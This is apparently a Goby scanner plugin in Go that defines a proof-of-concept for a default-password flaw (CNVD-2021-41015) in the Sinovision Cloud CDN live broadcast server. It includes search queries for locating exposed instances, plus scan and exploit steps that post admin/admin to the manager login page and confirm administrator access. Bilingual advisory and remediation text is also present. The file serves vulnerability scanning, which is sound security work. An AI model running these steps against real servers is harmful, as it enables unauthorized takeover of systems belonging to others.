package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Sinovision Cloud CDN live default passwd",
    "Description": "<p>CDN Live Broadcast Acceleration Server is a server for CDN live broadcast acceleration. The weak password vulnerability exists in the CDN Live broadcast acceleration server. The attacker can use the default password admin/admin to log in to the system background and obtain the background administrator permission.</p>",
    "Product": "Sinovision Cloud CDN live",
    "Homepage": "http://www.hassmedia.com/",
    "DisclosureDate": "2021-07-17",
    "Author": "afei_00123@foxmail.com",
    "FofaQuery": "body=\"src=\\\"img/dl.gif\\\"\" && title=\"系统登录\" && body=\"华视美达\"",
    "GobyQuery": "body=\"src=\\\"img/dl.gif\\\"\" && title=\"系统登录\" && body=\"华视美达\"",
    "Level": "1",
    "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.2. If not necessary, prohibit public network access to the system.3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-41015"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/newlive/manager/index.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastheader|regex|Set-Cookie: (.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/newlive/manager/login.php",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Cookie": "{{{Cookies}}}"
                },
                "data_type": "text",
                "data": "Name=admin&Pass=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "home.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/newlive/manager/index.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Cookie|lastbody|regex|Set-Cookie: (.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/newlive/manager/login.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Cookie": "{{{Cookies}}}"
                },
                "data_type": "text",
                "data": "Name=admin&Pass=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "home.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2021-41015"
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "华视私云-CDN直播加速服务器默认口令漏洞",
            "Product": "华视私云-CDN直播加速服务器",
            "Description": "<p>华视私云-CDN直播加速服务器是一款用于CDN直播加速的服务器。华视私云-CDN直播加速服务器存在弱口令漏洞，攻击者可利用默认口令admin/admin登录系统后台,获取后台管理员权限。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。2、如非必要，禁止公网访问该系统。3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能，造成敏感信息泄露。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Sinovision Cloud CDN live default passwd",
            "Product": "Sinovision Cloud CDN live",
            "Description": "<p>CDN Live Broadcast Acceleration Server is a server for CDN live broadcast acceleration. The weak password vulnerability exists in the CDN Live broadcast acceleration server. The attacker can use the default password admin/admin to log in to the system background and obtain the background administrator permission.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.2. If not necessary, prohibit public network access to the system.3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}